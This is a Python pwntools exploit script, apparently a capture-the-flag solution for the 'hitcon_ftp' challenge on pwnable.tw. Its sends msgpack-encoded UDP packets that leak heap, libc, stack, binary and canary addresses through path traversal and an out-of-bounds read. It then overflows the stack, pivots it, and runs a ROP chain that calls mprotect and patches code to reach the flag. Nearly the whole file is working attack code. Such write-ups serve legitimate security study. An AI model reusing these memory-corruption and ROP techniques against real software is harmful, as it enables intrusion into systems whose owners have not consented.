from pwn import *
from msgpack import *


elf = context.binary = ELF('hitcon_ftp')
libc = ELF('libc.so.6')


#s = process(['./hitcon_ftp', '1337'])
#local
#p = remote('0', 1337, typ='udp')
#p2 = remote('0', 1337, typ='udp')


#nc chall.pwnable.tw 10309
#server
c = remote('chall.pwnable.tw', 10309)
c.recvuntil(b'port: ')
port = int(c.recvline()[:-1].decode())
print('port: ', port)
p = remote('chall.pwnable.tw', port, typ='udp')
#p2 = remote('chall.pwnable.tw', port, typ='udp')



#p.send(p32(0x92) + b'A'*0x20)
#print(packb([1, 2, 3, 4]))
size = 0x10001
filename = 'solve.py'

mode = 'octet'
#p.send(packb([0xdeadbeefcafeba01, b'AAAABBBB', {'hi' : 'cc'}, 0x7777777788888888, 0x1234567898765432]))

#p.send(packb([size , filename, mode]))

#init 2 request
p.send(packb([0x10002, 'anything', 'octet']))
#p2.send(packb([0x10002, 'anything', 'octet']))
#print(unpackb(p.recv(0x100)))
absolute_path = '/home/nao/pwnable.tw/hitcon_ftp_not_solved'

filename = '../'.ljust(0x100, '/')
p.recv(1024)
p.send(packb([0x01, filename, 'octet']))
p.recvuntil(b'/'*(0x100 - 2))
leak = p.recv(6)
leak = int.from_bytes(leak, byteorder='little')
print('leak: ', hex(leak))
heap = leak - 0x22ad0
print('heap: ', hex(heap))

#free IO_FILE of p2
#p2.send(packb([0x01, filename, 'octet']))



#leak libc
first_request = heap + 0x23d10
ptr_to_libc = heap + 0x22d08
p.send(packb([0x02, 'anything', 'octet', p32(0x5) + p32(0) + p32(0x3f) + p32(0) + p64(ptr_to_libc) + p32(2), 0x300]))
p.recvuntil(b'iolation')
p.recvuntil(b'\x92\x06\x81\xa6')
leak = p.recv(6)
leak = int.from_bytes(leak, byteorder='little')
print('leak: ', hex(leak))
libc.address = leak - 0x3ec2c0
print('libc: ', hex(libc.address))



#leak stack
p.send(packb([0x02, 'anything', 'octet', p32(0x5) + p32(0) + p32(0x3f) + p32(0) + p64(libc.symbols['environ']) + p32(2), 0x300]))
p.recvuntil(b'\x92\x06\x81\xa6')
leak = p.recv(6)
leak = int.from_bytes(leak, byteorder='little')
print('leak: ', hex(leak))
ret_of_process_new = leak - 0x5a8
ret_main = ret_of_process_new + 0x4b0
print('ret process new: ', hex(ret_of_process_new))
print('ret main: ', hex(ret_main))

#leak pie
p.send(packb([0x02, 'anything', 'octet', p32(0x5) + p32(0) + p32(0x3f) + p32(0) + p64(ret_of_process_new) + p32(2), 0x300]))
p.recvuntil(b'\x92\x06\x81\xa6')
leak = p.recv(6)
leak = int.from_bytes(leak, byteorder='little')
print('leak: ', hex(leak))
elf.address = leak - 0x484f
print('elf: ', hex(elf.address))

#leak canary
canary_addr = ret_of_process_new - 0x10 + 1
p.send(packb([0x02, 'anything', 'octet', p32(0x5) + p32(0) + p32(0x3f) + p32(0) + p64(canary_addr) + p32(2), 0x300]))
leak = p.recvuntil(b'\x7f')[-6 - 7: -6]
leak = int.from_bytes(leak, byteorder='little')
print('leak: ', hex(leak))
canary = leak << 8
print('canary: ', hex(canary))


#change file_size
p.send(packb([0x02, 'anything', 'octet', p32(0x5) + p32(0) + p32(0x3f) + p32(0) + p64(next(elf.search(b'blksize\x00'))) + p32(2) + p32(0) + p64(0x1000), 0x300]))



#trigger stack overflow in main
#ret to process_new + 2010
LEAVE = 0x0000000000054803 + libc.address#: leave ; ret
print('LEAVE: ', hex(LEAVE))
payload = packb([0x03, 0, 0, b'A'*(0x240 - 5 - 0x10) + p64(LEAVE)[:-1]]).replace(b'\xc5', b'\xda')
p.send(payload) # overwrite ret main; we replace here to msgpack treat this as string
#change file_size
p.send(packb([0x02, 'anything', 'octet', p32(0x5) + p32(0) + p32(0x3f) + p32(0) + p64(next(elf.search(b'blksize\x00'))) + p32(2) + p32(0) + p64(0x1000), 0x300]))



#overwrite rbp
PIVOT = heap + 0x260
print('pivot to: ', hex(PIVOT))
payload = packb([0x03, 0, 0, b'A'*(0x240 - 5 - 0x8 - 0x10) + p64(PIVOT)]).replace(b'\xc5', b'\xda') # remove last null byte
p.send(payload)
#change file size
p.send(packb([0x02, 'anything', 'octet', p32(0x5) + p32(0) + p32(0x3f) + p32(0) + p64(next(elf.search(b'blksize\x00'))) + p32(2) + p32(0) + p64(0x1000), 0x300]))
payload = packb([0x03, 0, 0, b'A'*(0x240 - 5 - 0x8 - 0x10) + p64(PIVOT)[:-1]]).replace(b'\xc5', b'\xda') # remove last null byte
p.send(payload)




#recover canary
p.send(packb([0x02, 'anything', 'octet', p32(0x5) + p32(0) + p32(0x3f) + p32(0) + p64(next(elf.search(b'blksize\x00'))) + p32(2) + p32(0) + p64(0x1000), 0x300]))
payload = packb([0x03, 0, 0, b'A'*(0x240 - 5 - 0x30 + 1) + p64(canary >> 8)]).replace(b'\xc5', b'\xda')
p.send(payload)
p.send(packb([0x02, 'anything', 'octet', p32(0x5) + p32(0) + p32(0x3f) + p32(0) + p64(next(elf.search(b'blksize\x00'))) + p32(2) + p32(0) + p64(0x1000), 0x300]))
payload = packb([0x03, 0, 0, b'A'*(0x240 - 5 - 0x30) + b'\x00']).replace(b'\xc5', b'\xda') # remove first null byte
p.send(payload)



#gdb.attach(s, gdbscript='''
#           b *(main + 4113)
#           b process_new
#           b *(process_new + 953)
#           b *(main + 1467)
#           b *(process_new + 1952)
#            b *(template_execute + 199)
#           c''')

request_addr = heap + 0x23d10
print('request address: ', hex(request_addr))
print('wait')


#print(payload)
#print(packb([0x05, 0, 0, 'A'*(0x240 - 5)]))
#print(packb([0x05, 0, 0, b'A'*(0x240 - 5)]))

POP_RSI_RBP = 0x000000000007dd2e + libc.address #: pop rsi ; pop rbp ; ret
STRSTR = b"\x48\xC7\xC0\x00\x00\x00\x00\xC3"
STRNSTR_OFFSET = 0x40e0e0
MOV_PRDI_RSI = 0x000000000009d622 + libc.address#: xor eax, eax ; mov qword ptr [rdi], rsi ; ret
POP_RSP = 0x0000000000003960 + libc.address#: pop rsp ; ret
NEW_CMP = 0xe8858b485b75003c

rop = ROP(libc)
rop.raw(0)
rop.mprotect((elf.symbols['process_new'] + 380) & 0xfffffffffffff000, 0x1000, 7)
rop.rdi = elf.symbols['process_new'] + 380
rop.rsi = NEW_CMP
rop.raw(MOV_PRDI_RSI)
rop.rbp = ret_main - 0x8
rop.rdi = ret_main - 0x1000
rop.rsi = elf.symbols['main'] + 314
rop.raw(MOV_PRDI_RSI)
rop.raw(POP_RSP)
rop.raw(ret_main - 0x1000)




p.send(rop.chain())
#input('send?')
p.recvuntil(b'illegal packet')
for i in range(60):
    sleep(1)
    print(i)
# wait for signal
#filepath = '/home/nao/flag'
filepath = '/home/hitcon_ftp/flag'
p.send(packb([0x01, filepath, 'netascii'])) # set file path



p.interactive()